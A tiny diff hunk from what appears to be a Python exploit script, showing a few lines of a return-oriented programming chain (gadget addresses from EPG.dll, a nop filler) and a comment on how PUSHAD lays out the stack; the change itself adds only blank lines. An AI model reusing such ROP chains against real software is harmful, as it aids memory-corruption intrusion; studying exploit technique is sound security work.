@@ -58,6 +58,8 @@ import socket,struct
 0x6162f773, # POP EAX # RETN [EPG.dll] 
 0x90909090, # nop
 #####################################################################################
+
+
 # PUSHAD will push registers on the stack while moving ESP
 # register to point to the first pushed register as follows.
 # 
